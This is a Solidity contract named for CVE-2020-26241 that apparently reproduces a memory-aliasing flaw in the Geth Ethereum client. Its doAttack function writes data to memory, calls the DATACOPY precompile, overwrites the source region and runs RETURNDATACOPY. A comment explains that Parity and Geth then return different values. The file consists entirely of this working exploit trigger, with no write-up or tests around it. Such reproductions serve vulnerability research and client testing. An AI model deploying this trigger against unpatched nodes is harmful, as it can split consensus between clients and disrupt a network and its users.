// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract CVE_2020_26241 {

    function doAttack(bytes memory data) public returns (bytes memory) {
        /**
           writes X to an EVM memory region R,
           calls 0x00..04 (Precompiled DATACOPY contract) with R as an argument,
           overwrites R to Y,
           and finally invokes the RETURNDATACOPY opcode.
           When this contract is invoked, Parity would push X on the EVM stack, whereas Geth would push Y.
       **/

        //data is X and its location is the evm memory region R
        bytes memory ret = new bytes(data.length);
        bytes memory Y = "vghbghnjksvdvewfrgthyjukjyukyjtdfsfdrgthyhdngm"; //  allocate Y

        assembly {
            let len := mload(data) // returns size of bytes to use

        //call copy with region R as argument
            if iszero(call(gas(), 0x04, 0, add(data, 0x20), len, add(ret,0x20), len)) {
                invalid()
            }

        // The first 0x20 (32 bytes) represent length of the data Y, add it to the offset to get actual data
            let _Y := mload(add(Y, 0x20))
            mstore(add(data, 0x20), _Y) // overwrite region R with Y

        //invoke returndatacopy opcode
            let myLen := returndatasize()
            returndatacopy(add(add(ret, 0x20), 0x20), 0, myLen)
        }

        return ret;
    }

}
